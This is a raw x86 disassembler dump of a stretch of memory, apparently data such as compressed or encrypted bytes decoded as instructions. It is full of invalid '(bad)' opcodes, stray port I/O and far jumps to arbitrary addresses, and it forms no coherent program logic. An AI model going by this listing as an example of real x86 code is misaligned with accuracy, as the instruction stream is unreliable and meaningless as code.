  420800:	sbb    al,0xaf
  420802:	lods   eax,DWORD PTR ds:[esi]
  420803:	fcomp  QWORD PTR [esi]
  420805:	jle    0x42080e
  420807:	shl    eax,0x81
  42080a:	pop    es
  42080b:	ret    
  42080c:	jmp    0x8d83:0xedf8977f
  420813:	out    0x5,al
  420815:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420816:	sbb    ch,0x7
  420819:	test   BYTE PTR [edi-0x6858fc31],dl
  42081f:	add    ebp,edi
  420821:	jge    0x4207a8
  420823:	not    edx
  420825:	jnp    0x4208a0
  420827:	call   0x42082c
	...
  420850:	add    BYTE PTR [eax],al
  420852:	in     eax,0x9c
  420854:	and    dl,0xaa
  420857:	cmp    esi,DWORD PTR [ebx+eiz*8]
  42085a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42085b:	cmp    ebp,DWORD PTR [edx]
  42085d:	fst    QWORD PTR [ebx+ecx*4+0x7d98f85c]
  420864:	inc    esi
  420865:	shl    BYTE PTR [edx-0x7c],1
  420868:	push   ebp
  420869:	retf   0x8b98
  42086c:	sbb    ebx,edi
  42086e:	(bad)
  420872:	in     al,0x7e
  420874:	bound  edi,QWORD PTR [edx]
  420876:	inc    edx
  420877:	lods   al,BYTE PTR ds:[esi]
  420878:	addr16 sbb eax,0x1a540dd9
  42087e:	loope  0x42080b
  420880:	inc    edi
  420881:	sub    eax,0xfd66933a
  420886:	fdiv   QWORD PTR [esi+0x71]
  420889:	jmp    0xf5b4877b
  42088e:	cmp    eax,0xd6056d95
  420893:	js     0x420907
  420895:	jmp    0xcfac90f5
  42089a:	cmp    eax,0xa0cf6788
  42089f:	test   DWORD PTR [ebx],edi
  4208a1:	or     edi,DWORD PTR [edx]
  4208a3:	cmp    DWORD PTR ds:0x57af420f,ebp
  4208a9:	enter  0x7973,0x63
  4208ad:	sar    DWORD PTR ds:0x780977a2,0xa9
  4208b4:	push   eax
  4208b5:	jmp    0x4208ba
	...
  4208de:	add    BYTE PTR [eax],al
  4208e0:	ins    DWORD PTR es:[edi],dx
  4208e1:	mov    ebp,DWORD PTR [ebp-0x6d]
  4208e4:	pop    eax
  4208e5:	jp     0x42095b
  4208e7:	iret   
  4208e8:	test   BYTE PTR [edi+0x67],bh
  4208eb:	jmp    0x7dad9c33
  4208f0:	cmp    eax,0x7bbd3594
  4208f5:	xchg   edi,eax
  4208f6:	das    
  4208f7:	mov    dh,0xe
  4208f9:	dec    ebx
  4208fa:	sub    ebp,DWORD PTR [ebx-0x43cd6af4]
  420900:	jno    0x420899
  420902:	cmp    BYTE PTR [ecx],ah
  420904:	push   ecx
  420905:	inc    esp
  420906:	xor    dl,BYTE PTR [edi]
  420908:	cld    
  420909:	inc    ecx
  42090a:	das    
  42090b:	sbb    al,0x68
  42090d:	push   ebx
  42090e:	inc    esi
  42090f:	sub    BYTE PTR [ecx],al
  420911:	inc    edi
  420912:	das    
  420913:	add    BYTE PTR [ebx+0x19],ah
  420916:	xor    al,0x7d
  420918:	pop    ss
  420919:	iret   
  42091a:	imul   esi,DWORD PTR [esi+0x76],0x15
  42091e:	push   ecx
  42091f:	push   eax
  420920:	stc    
  420921:	hlt    
  420922:	pop    esi
  420923:	add    BYTE PTR [ebx-0x30],bh
  420926:	dec    edx
  420927:	push   ebx
  420928:	cmp    ch,dh
  42092a:	jo     0x4209a3
  42092c:	or     DWORD PTR ss:[edx+0x5c],esp
  420930:	cmp    DWORD PTR [esi],ebp
  420932:	jae    0x420995
  420934:	and    DWORD PTR [ebx],esi
  420936:	dec    ebp
  420937:	add    cl,bh
  420939:	das    
  42093a:	bound  esp,QWORD PTR [ecx+0x34]
  42093d:	cli    
  42093e:	imul   esi,DWORD PTR [ebp-0x47],0x4
  420942:	std    
  420943:	push   edx
	...
  42096c:	add    BYTE PTR [eax],al
  42096e:	xchg   BYTE PTR [ecx+esi*2],ch
  420971:	add    BYTE PTR [edi-0x68ffffa8],dl
  420977:	pop    eax
  420978:	add    BYTE PTR [eax],al
  42097a:	dec    ecx
  42097b:	push   edi
  42097c:	cmp    al,0x2f
  42097e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42097f:	cmp    al,0x50
  420981:	dec    edi
  420982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420983:	dec    ebx
  420984:	pop    ebx
  420985:	push   eax
  420986:	jbe    0x420993
  420988:	jo     0x420a01
  42098a:	mov    eax,0x6732610a
  42098f:	cmp    al,0x4f
  420991:	dec    ebp
  420992:	mov    bl,0x28
  420994:	pop    esp
  420995:	push   eax
  420996:	mov    dh,0xb
  420998:	jo     0x420a11
  42099a:	fmul   DWORD PTR [ecx]
  42099c:	popa   
  42099d:	xor    ah,BYTE PTR [edi+0x3c]
  4209a0:	inc    ebp
  4209a1:	dec    ebp
  4209a2:	xchg   esi,eax
  4209a3:	sub    BYTE PTR [eax+edx*2-0x4a],bl
  4209a7:	or     esi,DWORD PTR [eax+0x77]
  4209aa:	mov    eax,0x2732610a
  4209af:	xor    al,0x48
  4209b1:	push   esp
  4209b2:	jae    0x4209db
  4209b4:	dec    edx
  4209b5:	popa   
  4209b6:	fcomp  DWORD PTR ds:[esi+ebp*2-0x5d]
  4209bc:	cmc    
  4209bd:	jo     0x420948
  4209bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209c0:	mul    BYTE PTR [ebx+0x4c]
  4209c3:	add    al,BYTE PTR [ecx]
  4209c5:	pop    esp
  4209c6:	jae    0x420963
  4209c8:	in     eax,0x71
  4209ca:	imul   edx,DWORD PTR [ecx-0x27],0xd1966a65
  4209d1:	data16 add BYTE PTR [eax],al
	...
  4209fc:	pop    eax
  4209fd:	push   esi
  4209fe:	fnstenv [ebp+ebp*2+0x22]
  420a02:	mov    ch,0x66
  420a04:	push   eax
  420a05:	push   edi
  420a06:	and    al,0x4b
  420a08:	pop    edi
  420a09:	imul   ebx,eax,0xffffffff
  420a0c:	ins    BYTE PTR es:[edi],dx
  420a0d:	pop    ebp
  420a0e:	loop   0x420a83
  420a10:	dec    ecx
  420a11:	arpl   si,si
  420a13:	bound  ebx,QWORD PTR [edx]
  420a15:	outs   dx,DWORD PTR ds:[esi]
  420a16:	(bad)  [eax+0x2c]
  420a19:	and    eax,0x26206cf6
  420a1e:	lds    edx,FWORD PTR [edi+edx*1+0x14]
  420a22:	(bad)  [ecx+edx*1+0x31]
  420a26:	and    DWORD PTR [edi+eiz*1-0x34],ecx
  420a2a:	fistp  WORD PTR [edi]
  420a2c:	sti    
  420a2d:	and    bl,ah
  420a2f:	imul   edi,DWORD PTR [esi],0xffffffe6
  420a32:	mov    bh,0x66
  420a34:	(bad)  
  420a36:	fnstenv [eax-0x1f]
  420a39:	fucomi st,st(4)
  420a3b:	pop    ebx
  420a3c:	adc    ebx,ebp
  420a3e:	(bad)  
  420a3f:	arpl   cx,dx
  420a41:	in     al,dx
  420a42:	cmc    
  420a43:	pop    ds
  420a44:	or     esp,ebx
  420a46:	fld    TBYTE PTR [ebx+0x3e]
  420a49:	icebp  
  420a4a:	fldenv [ebp-0x2e]
  420a4d:	test   ah,ah
  420a4f:	jno    0x420a2c
  420a51:	in     eax,0xb7
  420a53:	popfw  
  420a55:	xchg   dl,bl
  420a57:	jo     0x4209fa
  420a59:	pop    ebx
  420a5a:	dec    ebp
  420a5b:	lock test DWORD PTR [edx+0xda50],esi
	...
  420a8a:	popf   
  420a8b:	jp     0x420aeb
  420a8d:	idiv   DWORD PTR [ecx]
  420a8f:	cwde   
  420a90:	dec    eax
  420a91:	frstor [ebp-0x5c24e5a5]
  420a97:	(bad)  
  420a98:	ss in  eax,0x8f
  420a9b:	adc    BYTE PTR [ebx],0xd6
  420a9e:	pusha  
  420a9f:	js     0x420ac9
  420aa1:	imul   BYTE PTR [ebp-0x72]
  420aa4:	inc    ebx
  420aa5:	(bad)  
  420aa6:	das    
  420aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa8:	cmp    ah,cl
  420aaa:	ins    DWORD PTR es:[edi],dx
  420aab:	pop    DWORD PTR [eax]
  420aad:	fisub  DWORD PTR [edx-0x72]
  420ab0:	out    0xbf,eax
  420ab2:	jo     0x420a43
  420ab4:	or     al,al
  420ab6:	pusha  
  420ab7:	(bad)  
  420ab8:	out    0xbf,eax
  420aba:	pusha  
  420abb:	(bad)
  420abf:	lea    ebp,[ecx]
  420ac1:	in     eax,0x26
  420ac3:	pop    ebx
  420ac4:	mov    ah,0xe4
  420ac6:	and    BYTE PTR [edi-0x37],dh
  420ac9:	fisubr DWORD PTR [ecx]
  420acb:	cmp    eax,eax
  420acd:	fldenv [eax]
  420acf:	pop    ebx
  420ad0:	mov    edx,0xbe8f1bda
  420ad5:	in     al,0xf
  420ad7:	sbb    BYTE PTR [ebx-0x3981ed2d],0x23
  420ade:	je     0x781efa9e
  420ae4:	call   0xe03:0x8a790123
  420aeb:	jl     0x420a88
  420aed:	fild   DWORD PTR [eax]
	...
  420b17:	add    BYTE PTR [ecx-0x5a],bl
  420b1a:	mov    bh,0xda
  420b1c:	fidivr WORD PTR [ecx-0x66]
  420b1f:	in     al,dx
  420b20:	into   
  420b21:	mov    es,WORD PTR [eax+ebx*8-0x78ff8bed]
  420b28:	sbb    cl,BYTE PTR [edx]
  420b2a:	dec    ebp
  420b2b:	jnp    0x420b41
  420b2d:	jg     0x420ba1
  420b2f:	dec    eax
  420b30:	adc    DWORD PTR [edx],ecx
  420b32:	inc    ecx
  420b33:	dec    eax
  420b34:	cs test eax,0x820e4850
  420b3a:	add    BYTE PTR [eax+0x1b],cl
  420b3d:	jnp    0x420bac
  420b3f:	cmp    al,0xe4
  420b41:	lea    esi,[ecx+0xf]
  420b44:	in     eax,0x77
  420b46:	addr16 jmp 0x4aafa54d
  420b4c:	pop    ss
  420b4d:	jne    0x420bae
  420b4f:	adc    BYTE PTR [esi],al
  420b51:	or     dl,BYTE PTR [edx+0xe]
  420b54:	fmul   QWORD PTR [ebp+0x7cd00875]
  420b5a:	pop    esp
  420b5b:	and    ah,dh
  420b5d:	jp     0x420bd1
  420b5f:	or     al,0xde
  420b61:	or     BYTE PTR [ebx+0x8],0xe5
  420b65:	jne    0x420b67
  420b67:	sub    al,0x91
  420b69:	test   al,0x67
  420b6b:	std    
  420b6c:	jl     0x420beb
  420b6e:	fisttp DWORD PTR fs:[eax+0x71e9718a]
  420b75:	jl     0x420bd8
  420b77:	shl    DWORD PTR [edi+0x76],0x6c
  420b7b:	mov    esi,0x0
	...
  420ba4:	add    BYTE PTR [eax],al
  420ba6:	sahf   
  420ba7:	nop
  420ba8:	add    BYTE PTR [ecx-0x3bae869a],bl
  420bae:	mov    ecx,DWORD PTR [edi-0x54c2449d]
  420bb4:	ins    DWORD PTR es:[edi],dx
  420bb5:	mov    ecx,0x9d72768d
  420bba:	cmp    eax,0x7c996dab
  420bbf:	jp     0x420c22
  420bc1:	xchg   BYTE PTR [eax+0x77],ch
  420bc4:	je     0x420baf
  420bc6:	ins    DWORD PTR es:[edi],dx
  420bc7:	jbe    0x420c39
  420bc9:	add    BYTE PTR [edi-0x378c9004],ah
  420bcf:	and    ch,BYTE PTR [edi+0x64]
  420bd2:	daa    
  420bd3:	xor    BYTE PTR [edx+0x74],ch
  420bd6:	mov    bh,0x2f
  420bd8:	bound  esi,QWORD PTR [edx-0x77]
  420bdb:	sub    BYTE PTR [edi+0x0],ch
  420bde:	xor    BYTE PTR fs:[ecx+0x70],dh
  420be2:	push   edi
  420be3:	and    ch,BYTE PTR [edi+0x74]
  420be6:	daa    
  420be7:	xor    BYTE PTR [edx+0x74],ch
  420bea:	inc    edi
  420beb:	sbb    al,0x60
  420bed:	arpl   WORD PTR [eax-0x8],si
  420bf0:	push   0x74
  420bf2:	out    0x2f,eax
  420bf4:	push   0x74
  420bf6:	aaa    
  420bf7:	das    
  420bf8:	pop    esi
  420bf9:	jae    0x420c3f
  420bfb:	or     ch,BYTE PTR [edx+esi*2+0x3b]
  420bff:	pop    edi
  420c00:	pop    ebp
  420c01:	arpl   WORD PTR [edx+eiz*1+0x72],ax
  420c05:	outs   dx,BYTE PTR ds:[esi]
  420c06:	sub    esp,DWORD PTR [ebp+0x5f]
  420c09:	data16 add BYTE PTR [eax],al
	...
  420c34:	cmp    BYTE PTR [edi+0x5d],bl
  420c37:	arpl   WORD PTR [edx+eiz*1],si
  420c3a:	jb     0x420caa
  420c3c:	mov    ebx,0xb1665f62
  420c41:	pop    esp
  420c42:	pop    esp
  420c43:	inc    edx
  420c44:	jbe    0x420c3e
  420c46:	dec    ecx
  420c47:	popa   
  420c48:	mov    ?,WORD PTR [eax]
  420c4a:	std    
  420c4b:	pop    ebx
  420c4c:	(bad)  [edx+eiz*2]
  420c4f:	and    ch,ah
  420c51:	std    
  420c52:	jo     0x420c75
  420c54:	xchg   edi,eax
  420c55:	das    
  420c56:	ins    BYTE PTR es:[edi],dx
  420c57:	retfw  
  420c59:	or     ebx,DWORD PTR [esi+0x72]
  420c5c:	mov    ah,BYTE PTR [eax]
  420c5e:	dec    edi
  420c5f:	dec    ecx
  420c60:	retf   
  420c61:	and    BYTE PTR [ecx+0x68],dl
  420c64:	mov    edx,0xcb61423c
  420c69:	cmp    eax,0xe13e5300
  420c6e:	fidiv  WORD PTR [ebx-0x37]
  420c71:	shl    dl,cl
  420c73:	(bad)  
  420c74:	jmp    0xd8ed:0xe253b9e3
  420c7b:	bound  ebx,QWORD PTR [esi-0x4c]
  420c7e:	loope  0x420cf3
  420c80:	pop    edi
  420c81:	(bad)  
  420c82:	int    0x70
  420c84:	mov    ds:0x9a1ff1a4,eax
  420c89:	lahf   
  420c8a:	hlt    
  420c8b:	ins    BYTE PTR es:[edi],dx
  420c8c:	xchg   edx,eax
  420c8d:	repnz int 0x6c
  420c90:	mov    WORD PTR [ebp+0x52a16ddb],ds
  420c96:	shl    BYTE PTR [esi+0x0],0x0
	...
  420cc2:	mov    WORD PTR [edi+0x446973e1],ds
  420cc8:	jmp    0x420cc9
  420cca:	add    DWORD PTR [ebp+edx*8+0x64],0x43d7536c
  420cd2:	push   edi
  420cd3:	fs add al,0x41
  420cd6:	imul   esp,DWORD PTR [edi-0x2a],0xdf3e3e73
  420cdd:	gs pop edi
  420cdf:	pop    es
  420ce0:	aad    0x73
  420ce2:	ds (bad) ds:[ecx+0x5e]
  420ce7:	adc    eax,0x653e6420
  420cec:	mov    bh,0x53
  420cee:	push   cs
  420cef:	push   edx
  420cf0:	mov    edi,0xd52b1f6a
  420cf5:	pop    ds
  420cf6:	call   DWORD PTR ds:0x251b71dd
  420cfc:	repnz (bad) 
  420cfe:	in     al,dx
  420cff:	into   
  420d00:	int3   
  420d01:	dec    edi
  420d02:	pop    esi
  420d03:	in     eax,0xdf
  420d05:	jno    0x420cf7
  420d07:	push   ss
  420d08:	out    dx,eax
  420d09:	inc    DWORD PTR [ecx]
  420d0b:	jmp    0x5b603de0
  420d10:	mov    edx,0x8490efe0
  420d15:	icebp  
  420d16:	pop    ecx
  420d17:	xchg   edi,eax
  420d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d19:	ror    DWORD PTR [esi],cl
  420d1b:	cmp    esi,DWORD PTR [edx+esi*8-0x4a387324]
  420d22:	loopne 0x420d99
  420d24:	test   BYTE PTR [ebx],al
	...
  420d4e:	add    BYTE PTR [eax],al
  420d50:	(bad)  
  420d51:	cwde   
  420d52:	fwait
  420d53:	rcl    DWORD PTR [ecx-0x50],cl
  420d56:	jp     0x420d38
  420d58:	scas   eax,DWORD PTR es:[edi]
  420d59:	cmp    esi,DWORD PTR ds:0xe78094e5
  420d5f:	mov    ch,0x8b
  420d61:	scas   eax,DWORD PTR es:[edi]
  420d62:	aaa    
  420d63:	and    al,0x7d
  420d65:	js     0x420daf
  420d67:	fst    QWORD PTR [ebp-0x621fd7c5]
  420d6d:	mov    DWORD PTR [ebx+esi*8+0x6e],eax
  420d71:	pop    ebx
  420d72:	and    eax,0x7ab8db6
  420d77:	shr    DWORD PTR [esi-0x80],1
  420d7a:	sbb    DWORD PTR [eax+esi*2],esp
  420d7d:	jl     0x420d8b
  420d7f:	loope  0x420d5a
  420d81:	cwde   
  420d82:	and    eax,0x3a3b81d0
  420d87:	loope  0x420dd8
  420d89:	lea    ecx,[edx+esi*8]
  420d8c:	rcl    DWORD PTR [ebx+0x3b09c52c],0x1a
  420d93:	loope  0x420dc4
  420d95:	lea    eax,[edx+esi*8]
  420d98:	test   eax,0xf1c4b493
  420d9d:	cmp    dh,BYTE PTR [edx+esi*8-0x49f876e4]
  420da4:	lock ja 0x420d6b
  420da7:	add    edi,ebp
  420da9:	ja     0x420d73
  420dab:	fcom   QWORD PTR ds:0xdcfaf5b
  420db1:	stos   DWORD PTR es:[edi],eax
  420db2:	add    BYTE PTR [ecx],cl
	...
  420ddc:	add    BYTE PTR [eax],al
  420dde:	(bad)  
  420ddf:	mov    esp,DWORD PTR [ebx-0x45]
  420de2:	cmp    eax,0x8dbd5493
  420de7:	push   cx
  420de9:	test   BYTE PTR [edi-0x70],cl
  420dec:	arpl   WORD PTR [ebx-0x62ad55e3],bx
  420df2:	cmp    eax,0xc994dab
  420df7:	cmp    edx,DWORD PTR [ebx+0x7a]
  420dfa:	push   ds
  420dfb:	mov    WORD PTR [eax],es
  420dfd:	mov    al,ds:0xc95044f6
  420e02:	push   cs
  420e03:	mov    esp,DWORD PTR [ebx+0x5b]
  420e06:	cmp    dl,BYTE PTR [ebx-0x6f0dcaac]
  420e0c:	pop    edi
  420e0d:	inc    eax
  420e0e:	mul    BYTE PTR [ebp+0x53]
  420e11:	pop    edx
  420e12:	jmp    0x1d792ea2
  420e17:	jno    0x420e7c
  420e19:	jmp    0x1996b7d3
  420e1e:	test   eax,0x223d67a4
  420e23:	lods   al,BYTE PTR ds:[esi]
  420e24:	arpl   WORD PTR [ebx],bx
  420e26:	sar    BYTE PTR [eax+0x72],1
  420e29:	jmp    0x39969f1c
  420e2e:	sbb    ch,BYTE PTR [edx+0x5cc0471]
  420e34:	std    
  420e35:	sbb    DWORD PTR [ebx-0x7236ce6b],ecx
  420e3b:	jbe    0x420eaf
  420e3d:	std    
  420e3e:	cmp    eax,0x154bac
	...
  420e6b:	add    BYTE PTR [edx-0x5029af9b],dl
  420e71:	mov    DWORD PTR [eax],eax
  420e73:	mov    al,0xd0
  420e75:	inc    esp
  420e76:	push   eax
  420e77:	or     DWORD PTR [edx+0x76],ebp
  420e7a:	jb     0x420e51
  420e7c:	cmp    eax,0xc800505b
  420e81:	sub    DWORD PTR [eax],esi
  420e83:	and    bh,dl
  420e85:	clc    
  420e86:	outs   dx,DWORD PTR ds:[esi]
  420e87:	jae    0x420e39
  420e89:	outs   dx,DWORD PTR cs:[esi]
  420e8b:	fs gs pop ecx
  420e8e:	inc    ebp
  420e8f:	dec    ebp
  420e90:	xchg   esi,eax
  420e91:	sub    DWORD PTR ds:0x700ac650,ebx
  420e97:	ja     0x420e51
  420e99:	or     esp,DWORD PTR [ecx+0x32]
  420e9c:	push   edi
  420e9d:	iret   
  420e9e:	dec    edx
  420e9f:	push   esp
  420ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ea1:	cmp    DWORD PTR [eax+0x61],edx
  420ea4:	mov    ah,0xb
  420ea6:	je     0x420f17
  420ea8:	mov    ch,0x24
  420eaa:	das    
  420eab:	add    bh,bl
  420ead:	adc    al,0x51
  420eaf:	push   eax
  420eb0:	push   0xfffffff8
  420eb2:	gs ins BYTE PTR es:[edi],dx
  420eb4:	inc    edi
  420eb5:	das    
  420eb6:	pop    esi
  420eb7:	jae    0x420f2d
  420eb9:	imul   BYTE PTR [ebx+0x72]
  420ebc:	or     DWORD PTR [ecx+0x0],0x53
  420ec0:	dec    edx
  420ec1:	sub    ecx,DWORD PTR [ebp+0x20]
  420ec4:	push   edi
  420ec5:	clc    
  420ec6:	outs   dx,DWORD PTR ds:[esi]
  420ec7:	jae    0x420ef9
  420ec9:	outs   dx,DWORD PTR cs:[esi]
  420ecb:	fs in  eax,0x58
  420ece:	add    BYTE PTR [eax+0x0],dl
	...
  420ef9:	add    BYTE PTR [eax],ch
  420efb:	das    
  420efc:	xor    BYTE PTR [eax],ah
  420efe:	pop    ss
  420eff:	clc    
  420f00:	outs   dx,DWORD PTR ds:[esi]
  420f01:	jae    0x420f33
  420f03:	outs   dx,DWORD PTR cs:[esi]
  420f05:	xlat   BYTE PTR fs:[ebx]
  420f07:	ror    DWORD PTR [ecx+0x41],0x27
  420f0b:	aas    
  420f0c:	push   eax
  420f0d:	popa   
  420f0e:	mov    ah,0xb
  420f10:	je     0x420f81
  420f12:	mov    ch,0x24
  420f14:	std    
  420f15:	dec    ebp
  420f16:	dec    ecx
  420f17:	sub    ecx,DWORD PTR [ebp+0x20]
  420f1a:	out    0xf9,eax
  420f1c:	outs   dx,DWORD PTR ds:[esi]
  420f1d:	jae    0x420f8f
  420f1f:	das    
  420f20:	outs   dx,DWORD PTR ds:[esi]
  420f21:	fs ds repnz mov eax,0x20c1f253
  420f29:	push   eax
  420f2a:	pop    ds
  420f2b:	shr    edi,0x74
  420f2e:	jmp    0xd41ebf2
  420f33:	mov    edi,0xe21e4fcc
  420f38:	loope  0x420faa
  420f3a:	in     eax,dx
  420f3b:	in     al,0xd3
  420f3d:	jno    0x420f21
  420f3f:	icebp  
  420f40:	add    BYTE PTR [ecx-0x1f],dl
  420f43:	shr    esp,cl
  420f45:	je     0x420f26
  420f47:	(bad)  
  420f49:	pop    ebx
  420f4a:	repz jmp 0x65d4:0x81a971df
  420f52:	stos   BYTE PTR es:[edi],al
  420f53:	out    dx,al
  420f54:	mov    ecx,0xeedfb26d
  420f59:	ins    DWORD PTR es:[edi],dx
  420f5a:	fwait
  420f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f5c:	and    al,0x3f
	...
  420f86:	add    BYTE PTR [eax],al
  420f88:	popf   
  420f89:	xchg   ecx,eax
  420f8a:	icebp  
  420f8b:	jb     0x420f2d
  420f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f8e:	and    al,0x4b
  420f90:	lahf   
  420f91:	inc    esp
  420f92:	jecxz  0x420ff8
  420f94:	fwait
  420f95:	inc    eax
  420f96:	sar    BYTE PTR [esi],0x5d
  420f99:	xchg   ecx,eax
  420f9a:	icebp  
  420f9b:	jb     0x420ffd
  420f9d:	inc    esi
  420f9e:	aad    0xff
  420fa0:	jbe    0x420f40
  420fa2:	out    0x6d,eax
  420fa4:	push   0x6b
  420fa6:	fsub   DWORD PTR [esi+0x63]
  420fa9:	popa   
  420faa:	add    al,0x51
  420fac:	popa   
  420fad:	push   esp
  420fae:	fdiv   DWORD PTR [edi+ebx*2+0x60]
  420fb2:	out    0x5b,eax
  420fb4:	jae    0x421021
  420fb6:	in     eax,0x71
  420fb8:	sub    DWORD PTR [ecx],eax
  420fba:	repnz sub ch,BYTE PTR gs:[esi-0x2f]
  420fbf:	and    BYTE PTR gs:[ebx-0x1b],bl
  420fc3:	bound  eax,QWORD PTR [edx]
  420fc5:	pop    ebx
  420fc6:	mov    dh,0xd8
  420fc8:	or     eax,0x26f2ce77
  420fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fcf:	rol    BYTE PTR [eax],1
  420fd1:	cmp    ebp,DWORD PTR [eax-0x438be11a]
  420fd7:	icebp  
  420fd8:	in     eax,dx
  420fd9:	cmp    ch,BYTE PTR [esp+eiz*8-0x1731861d]
  420fe0:	out    dx,eax
  420fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fe2:	test   al,0xe6
  420fe4:	fidiv  WORD PTR [ebx-0x64]
  420fe7:	icebp  
  420fe8:	int    0x87
  420fea:	out    0xb6,eax
	...
  421014:	add    BYTE PTR [eax],al
  421016:	loop   0x421094
  421018:	(bad)  
  42101b:	mov    BYTE PTR [edi+edi*4-0x2a758e0c],al
  421022:	stos   BYTE PTR es:[edi],al
  421023:	mov    cs,WORD PTR [esi-0x61605217]
  421029:	in     al,dx
  42102a:	fwait
  42102b:	ja     0x4210ab
  42102d:	fisubr DWORD PTR [esi+0x75b8353b]
  421033:	sahf   
  421034:	push   esp
  421035:	(bad)  
  421036:	(bad)  
  421037:	js     0x42107e
  421039:	fdiv   DWORD PTR [ebx+0x78]
  42103c:	pop    ecx
  42103d:	xlat   BYTE PTR ds:[ebx]
  42103e:	cwde   
  42103f:	jb     0x421096
  421041:	rcl    BYTE PTR [edx+0x62e84d74],0x8a
  421048:	cmp    ah,BYTE PTR [esi*2-0x7f28c588]
  42104f:	jp     0x421061
  421051:	repnz bound edi,QWORD PTR [ebx]
  421054:	cmp    bl,cl
  421056:	pop    edi
  421057:	mov    ss,WORD PTR [eax]
  421059:	xlat   BYTE PTR ds:[ebx]
  42105a:	dec    ebp
  42105b:	js     0x421059
  42105d:	mov    edi,0xea168d71
  421062:	and    BYTE PTR [edi+0x4],ch
  421065:	xlat   BYTE PTR ds:[ebx]
  421066:	adc    eax,0xa1000090
  42106b:	mov    WORD PTR [ebp-0x6],gs
  42106e:	lods   al,BYTE PTR ds:[esi]
  42106f:	js     0x4210e5
  421071:	or     DWORD PTR [ebp-0x73],ebp
  421074:	je     0x421043
  421076:	mov    WORD PTR [edi+0x69],gs
  421079:	or     DWORD PTR [eax],eax
	...
  4210a3:	add    BYTE PTR [ebx+0x70],bh
  4210a6:	je     0x42106c
  4210a8:	imul   esi,DWORD PTR [eax+0x63],0xffffffbd
  4210ac:	sbb    eax,0x89b563ac
  4210b1:	jns    0x421121
  4210b3:	into   
  4210b4:	nop
  4210b5:	add    dl,BYTE PTR [edx-0x42]
  4210b8:	push   edi
  4210b9:	mov    ?,WORD PTR [ebp-0x78]
  4210bc:	jae    0x42113b
  4210be:	pop    esp
  4210bf:	lods   al,BYTE PTR ds:[esi]
  4210c0:	bound  edi,QWORD PTR [ebx+0x72]
  4210c3:	xchg   BYTE PTR [eax+0x6f],dh
  4210c6:	xchg   bp,ax
  4210c8:	and    DWORD PTR [edi+0x6f219767],0x915d7a75
  4210d2:	push   esp
  4210d3:	xchg   ebp,eax
  4210d4:	add    BYTE PTR [ebp+0x70167b72],cl
  4210da:	je     0x42111b
  4210dc:	and    DWORD PTR [ecx+esi*2+0x5c700f50],ecx
  4210e3:	ds adc eax,0xe73e6470
  4210e9:	mov    ah,BYTE PTR [eax]
  4210eb:	xor    al,0xe1
  4210ed:	mov    dh,BYTE PTR [ecx+0x48]
  4210f0:	out    0x78,eax
  4210f2:	outs   dx,BYTE PTR ds:[esi]
  4210f3:	dec    esi
  4210f4:	and    ch,BYTE PTR [ebx+esi*2+0x71890b4b]
  4210fb:	sbb    eax,0x395c74e1
  421100:	call   0xce427773
  421105:	jl     0x421178
  421107:	sub    eax,0x0
	...
  421130:	add    BYTE PTR [eax],al
  421132:	out    dx,eax
  421133:	mov    WORD PTR [eax+eax*1+0x53],?
  421137:	or     al,0x6c
  421139:	imul   esp,DWORD PTR [edi-0x5499943a],0x22
  421140:	pop    esi
  421141:	jb     0x42117d
  421143:	sbb    ecx,DWORD PTR [edx+0x69]
  421146:	test   BYTE PTR [edi],ah
  421148:	ins    BYTE PTR es:[edi],dx
  421149:	jae    0x4210cb
  42114b:	repz jo 0x4211aa
  42114e:	fimul  WORD PTR [ebx]
  421150:	jno    0x4211b7
  421152:	or     esp,DWORD PTR gs:[edx+0x74]
  421156:	inc    edi
  421157:	push   ds
  421158:	pusha  
  421159:	arpl   WORD PTR [eax+0x37746b28],ax
  42115f:	adc    bl,BYTE PTR [esi+0x6e]
  421162:	jbe    0x421156
  421164:	popa   
  421165:	jb     0x4211ce
  421167:	sub    dh,BYTE PTR [edx+0x74]
  42116a:	ret    
  42116b:	or     ch,BYTE PTR [ebx+ebp*2+0x57]
  42116f:	sar    DWORD PTR ds:0x720ab463,0x6e
  421176:	mov    ebx,0xbb68fd27
  42117b:	stc    
  42117c:	push   0x74
  42117e:	mov    esi,0xb66365f2
  421183:	sub    BYTE PTR [esi+0x6f],ah
  421186:	jno    0x4211df
  421188:	gs fs jp 0x421199
  42118c:	jno    0x4211f7
  42118e:	imul   esp,DWORD PTR [edx+ebp*2],0x67
  421192:	gs push edi
  421194:	outs   dx,BYTE PTR gs:[esi]
	...
  4211be:	add    BYTE PTR [eax],al
  4211c0:	mov    ah,BYTE PTR [ebx]
  4211c2:	pusha  
  4211c3:	outs   dx,DWORD PTR ds:[esi]
  4211c4:	xor    al,0x1c
  4211c7:	jae    0x421243
  4211c9:	sub    DWORD PTR [ebx+0x65],esi
  4211cc:	and    eax,0x34617037
  4211d1:	es je  0x421243
  4211d4:	xor    eax,0x3e006ff3
  4211d9:	pop    ecx
  4211da:	aad    0x73
  4211dc:	push   edx
  4211dd:	add    eax,esi
  4211df:	push   0x60e3535e
  4211e4:	and    DWORD PTR [edi],eax
  4211e6:	out    dx,eax
  4211e7:	jae    0x421247
  4211e9:	push   edi
  4211ea:	loope  0x421259
  4211ec:	pop    ds
  4211ed:	pop    ecx
  4211ee:	in     eax,0x71
  4211f0:	pop    esi
  4211f1:	and    ah,dl
  4211f3:	jo     0x421202
  4211f5:	sub    eax,esi
  4211f7:	jno    0x42121b
  4211f9:	and    eax,0x171a6701
  4211fe:	out    dx,eax
  4211ff:	jae    0x4211e8
  421201:	mov    ebp,0xf1ed62e9
  421206:	(bad)  [edx]
  421208:	or     bh,BYTE PTR cs:[ecx+0x15021b2a]
  42120f:	pop    eax
  421210:	sub    ecx,DWORD PTR [edi]
